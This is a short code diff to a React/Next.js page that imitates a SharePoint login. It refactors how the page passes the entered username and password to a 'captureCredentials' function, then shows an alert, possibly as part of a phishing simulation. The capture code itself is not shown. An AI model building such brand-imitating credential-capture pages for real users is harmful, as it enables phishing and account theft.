@@ -1,6 +1,5 @@
 'use client';
 import { FormEvent, useState } from 'react';
-import { ai } from '@/ai/genkit';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
@@ -16,6 +15,7 @@ import {
 import { ShieldX } from 'lucide-react';
 import { PlaceHolderImages } from '@/lib/placeholder-images';
 import Image from 'next/image';
+import { captureCredentials } from '@/ai/flows/capture-credentials';
 
 export default function SharePointLoginPage() {
   const [username, setUsername] = useState('');
@@ -25,7 +25,7 @@ export default function SharePointLoginPage() {
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-    await ai.flow.captureCredentialsFlow({ username, password });
+    await captureCredentials({ username, password });
     setShowAlert(true);
   };
 
